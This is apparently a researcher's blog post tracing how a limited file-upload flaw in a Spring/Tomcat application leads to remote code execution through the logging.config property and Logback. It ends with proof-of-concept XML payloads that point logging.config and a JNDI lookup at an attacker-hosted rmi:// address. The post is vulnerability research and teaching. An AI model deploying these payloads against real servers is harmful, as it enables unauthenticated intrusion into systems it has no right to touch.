---
layout: post
title: "Remote Code Execution with Spring Properties"
date: 2024-11-26 09:00:00 +1100
categories: blog
---

Recently a past student came to me with a very interesting unauthenticated vulnerability in a Spring application that they were having a hard time exploiting. I managed to spend some time on this problem last weekend and came up with a relatively clean solution, although I would have preferred a more generic solution to exploiting Spring applications via this vector. Let's dive in, shall we?

<!--more-->

## The Vulnerability

Since it's not my bug and it's not patched, I can only share the mock-up code but the bug looks something like this:

```java
/*  152 */             MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
/*  153 */             MultipartFile multipart = multipartRequest.getFile("file");
/*  154 */             String fileName = multipart.getOriginalFilename(); // 1
/*  155 */             String fileExtension = FilenameUtils.getExtension(fileName); // 2
/*  156 */             if (!supportContentType(fileExtension)) { // 3
/*  157 */               throw new Exception("blah");
/*      */             }
/*  159 */             File file = new File(fileName);
/*  160 */             multipart.transferTo(file); // 4
```

The `supportContentType` call was a check that the filename had one of the following extensions:

```java
/* 95 */ public static List<String> fexts = Arrays.asList(new String[] { "gif", "jpeg", "jpg", "png", "swf", "bmp", "asf", "avi", "mpeg", "mpg", "ts", "trp", "m2v", "m2p", "mp4", "m1v", "m4v", "m4t", "vob", "m2t", "tsp", "mov", "asx", "wmv", "tp", "doc", "docx", "ppt", "pptx", "xls", "xlsx", "htm", "html", "pps", "ppsx", "pdf", "mp3", "ogg", "wav", "wma", "mp2", "ac3", "pcm", "lpcm", "flv", "wmf", "emf", "tif", "tiff", "mid", "mkv", "ra", "rm", "ram", "rmvb", "3gp", "svi", "m2ts", "divx", "mts", "vro", "zip", "xml", "wgt", "aisr" });
```

If the extension is not on the allow list at [3], the code will throw and exception. However, if it's on the allow list, then the code will proceed to write the uploaded file at [4]. At [1] the code just gets the filename, so we can't use traversals here. Additionally, there no path is given, which means that by default, the service will write into the base directory of the tomcat server: `C:\[redacted]\tomcat\bin`.

## Exploitation Approach

I was inspired by a [good friend](https://x.com/chudyPB) who abused jailed file write for a full unauthenticated remote code execution in a product that I had once looked at. Never really exploiting such tight restrictions I was curious on how one might approach this type of bug. On the surface, this seems like it isn't exploitable because we have a limited file write. We can't control the location of the write and we have an allow list of extensions that don't seem interesting... or do they?

The two extensions that stood out to me was `.zip` and `.xml`. Tomcat loves to process `xml` files, let's try this first. After studying the `tomcat9.exe` process for a bit, I noticed that it attempts to load a non-existent file: `application.xml`.

![](/assets/images/remote-code-execution-with-spring-properties/loading-properties.png "Looking for application.xml")

When I placed an invalid `xml` file in the directory I saw a stack-trace where it was trying to load the file using the class `ConfigFileApplicationListener`. According to this [blog post](https://juejin.cn/post/6972564484720328718) the Listener attempts to load application configuration files from the following extensions in the following order:

- properties
- xml
- yml
- yaml

This was matching to exactly what I saw in Process Monitor. What's interesting is that the `xml` extension is hardly documented but a quick google search leads me to the official Spring [Common Application Properties](https://docs.spring.io/spring-boot/appendix/application-properties/index.html) documentation. There are several properties but the one that stood out to me quite quickly was the `logging.config`. This was used by the `org.springframework.boot.context.logging.LoggingApplicationListener` class. Studying the class, we find the following code:

```java
/*     */   public void onApplicationEvent(ApplicationEvent event) {
/* 219 */     if (event instanceof ApplicationStartingEvent) {
/* 220 */       onApplicationStartingEvent((ApplicationStartingEvent)event);
/*     */     }
/* 222 */     else if (event instanceof ApplicationEnvironmentPreparedEvent) {
/* 223 */       onApplicationEnvironmentPreparedEvent((ApplicationEnvironmentPreparedEvent)event); // 1
/*     */     }
/* 225 */     else if (event instanceof ApplicationPreparedEvent) {
/* 226 */       onApplicationPreparedEvent((ApplicationPreparedEvent)event);
/*     */     }
/* 228 */     else if (event instanceof ContextClosedEvent && ((ContextClosedEvent)event)
/* 229 */       .getApplicationContext().getParent() == null) {
/* 230 */       onContextClosedEvent();
/*     */     }
/* 232 */     else if (event instanceof org.springframework.boot.context.event.ApplicationFailedEvent) {
/* 233 */       onApplicationFailedEvent();
/*     */     } 
/*     */   }
```

At [1] the `onApplicationEvent` calls  the `onApplicationEnvironmentPreparedEvent` method:

```java
/*     */   private void onApplicationEnvironmentPreparedEvent(ApplicationEnvironmentPreparedEvent event) {
/* 243 */     if (this.loggingSystem == null) {
/* 244 */       this.loggingSystem = LoggingSystem.get(event.getSpringApplication().getClassLoader());
/*     */     }
/* 246 */     initialize(event.getEnvironment(),  event.getSpringApplication().getClassLoader()); // 2
/*     */   }
```

At [2] the `initialize` method is called with the environment as the first argument:

```java
/*     */   protected void initialize(ConfigurableEnvironment environment, ClassLoader classLoader) {
/* 281 */     (new LoggingSystemProperties(environment)).apply();
/* 282 */     this.logFile = LogFile.get(environment);
/* 283 */     if (this.logFile != null) {
/* 284 */       this.logFile.applyToSystemProperties();
/*     */     }
/* 286 */     this.loggerGroups = new LoggerGroups(DEFAULT_GROUP_LOGGERS);
/* 287 */     initializeEarlyLoggingLevel(environment);
/* 288 */     initializeSystem(environment, this.loggingSystem, this.logFile); // 3
/* 289 */     initializeFinalLoggingLevels(environment, this.loggingSystem);
/* 290 */     registerShutdownHookIfNecessary(environment, this.loggingSystem);
/*     */   }
```

At [3] the `initializeSystem` is called with the environment. Remember, we can set properties on the environment with the vulnerability at hand.

```java
/*     */   private void initializeSystem(ConfigurableEnvironment environment, LoggingSystem system, LogFile logFile) {
/* 310 */     LoggingInitializationContext initializationContext = new LoggingInitializationContext(environment);
/* 311 */     String logConfig = environment.getProperty("logging.config"); // 4
/* 312 */     if (ignoreLogConfig(logConfig)) {
/* 313 */       system.initialize(initializationContext, null, logFile);
/*     */     } else {
/*     */       
/*     */       try {
/* 317 */         ResourceUtils.getURL(logConfig).openStream().close();
/* 318 */         system.initialize(initializationContext, logConfig, logFile); // 5
/*     */       }
/* 320 */       catch (Exception ex) {
/*     */         
/* 322 */         System.err.println("Logging system failed to initialize using configuration from '" + logConfig + "'");
/* 323 */         ex.printStackTrace(System.err);
/* 324 */         throw new IllegalStateException(ex);
/*     */       } 
/*     */     } 
/*     */   }
```

At [4] the code will grab the property `logging.config` from the environment and parse it to a call to `initialize` on the `org.springframework.boot.logging.logback.LogbackLoggingSystem` class at [5].

```java
/*     */   public void initialize(LoggingInitializationContext initializationContext, String configLocation, LogFile logFile) {
/* 109 */     LoggerContext loggerContext = getLoggerContext();
/* 110 */     if (isAlreadyInitialized(loggerContext)) {
/*     */       return;
/*     */     }
/* 113 */     super.initialize(initializationContext, configLocation, logFile); // 6
/* 114 */     loggerContext.getTurboFilterList().remove(FILTER);
/* 115 */     markAsInitialized(loggerContext);
/* 116 */     if (StringUtils.hasText(System.getProperty("logback.configurationFile"))) {
/* 117 */       getLogger(LogbackLoggingSystem.class.getName()).warn("Ignoring 'logback.configurationFile' system property. Please use 'logging.config' instead.");
/*     */     }
/*     */   }
```

At [6] the code will call `super.initialize` with the attacker controlled property. This will flow to a parent class: `org.springframework.boot.logging.AbstractLoggingSystem`:

```java
/*     */   public void initialize(LoggingInitializationContext initializationContext, String configLocation, LogFile logFile) {
/*  55 */     if (StringUtils.hasLength(configLocation)) {
/*  56 */       initializeWithSpecificConfig(initializationContext, configLocation, logFile); // 7
/*     */       return;
/*     */     } 
/*  59 */     initializeWithConventions(initializationContext, logFile);
/*     */   }

/*     */   private void initializeWithSpecificConfig(LoggingInitializationContext initializationContext, String configLocation, LogFile logFile) {
/*  64 */     configLocation = SystemPropertyUtils.resolvePlaceholders(configLocation);
/*  65 */     loadConfiguration(initializationContext, configLocation, logFile); // 8
/*     */   }
```

At [7] the flow continues to `initializeWithSpecificConfig` and then to `loadConfiguration` at [8]. Since `loadConfiguration` isn't defined in the parent class it will flow back to the child class `org.springframework.boot.logging.logback.LogbackLoggingSystem`:

```java
/*     */   protected void loadConfiguration(LoggingInitializationContext initializationContext, String location, LogFile logFile) {
/* 136 */     super.loadConfiguration(initializationContext, location, logFile);
/* 137 */     LoggerContext loggerContext = getLoggerContext();
/* 138 */     stopAndReset(loggerContext);
/*     */     try {
/* 140 */       configureByResourceUrl(initializationContext, loggerContext, ResourceUtils.getURL(location)); // 9
/*     */     }
/* 142 */     catch (Exception ex) {
/* 143 */       throw new IllegalStateException("Could not initialize Logback logging from " + location, ex);
/*     */     } 
/* 145 */     List<Status> statuses = loggerContext.getStatusManager().getCopyOfStatusList();
/* 146 */     StringBuilder errors = new StringBuilder();
/* 147 */     for (Status status : statuses) {
/* 148 */       if (status.getLevel() == 2) {
/* 149 */         errors.append((errors.length() > 0) ? String.format("%n", new Object[0]) : "");
/* 150 */         errors.append(status.toString());
/*     */       } 
/*     */     } 
/* 153 */     if (errors.length() > 0) {
/* 154 */       throw new IllegalStateException(String.format("Logback configuration error detected: %n%s", new Object[] { errors }));
/*     */     }
/*     */   }
/*     */ 
/*     */   
/*     */   private void configureByResourceUrl(LoggingInitializationContext initializationContext, LoggerContext loggerContext, URL url) throws JoranException {
/* 160 */     if (url.toString().endsWith("xml")) {
/* 161 */       JoranConfigurator configurator = new SpringBootJoranConfigurator(initializationContext);
/* 162 */       configurator.setContext(loggerContext);
/* 163 */       configurator.doConfigure(url); // 10
/*     */     } else {
/*     */       
/* 166 */       (new ContextInitializer(loggerContext)).configureByResource(url);
/*     */     } 
/*     */   }
```

Following the flow of the `location` argument which is controlled by the attacker, we can reach `configureByResourceUrl` at [9] with the location converted to a `URL`. Finally, at [10] we can see that the (in)famous `JoranConfigurator` initialized and then finally a call to `doConfigure`.

Those that have attended my class probably know where this is going. We can use a `logback.xml` URL to reconfigure the log-back library. The final proof of concept `application.xml` looks like this:

```xml
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
    <entry key="logging.config">http://[attacker]:[port]/logback.xml</entry>
</properties>
```

and the corresponding log-back file which may look familiar to some:

```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://[attacker]:1099/Object" as="appName" />
</configuration>
```

The stars aligned here, we found a way to restart the server remotely using one of the exposed REST API's and of course `ELProcessor` was included in the class path. The result:

![](/assets/images/remote-code-execution-with-spring-properties/rce.png "Getting RCE via JNDI injection (ab)using Spring properties")

## Concluding thoughts

There are likely many other ways to gain remote code execution here such as defining log file paths and other vectors. I didn't have a lot of time to look at this and I just went with the first approach that worked. I encourage other researchers to dive into the Spring framework and find other Listeners using environment properties and find other vectors for exploitation! There are other vectors for code injection using log-back, such as JDBC (taught in class) and (ab)using the un-marshaller directly. But that is an exercise for the reading researcher.

## References

- [https://juejin.cn/post/6972564484720328718](https://juejin.cn/post/6972564484720328718)
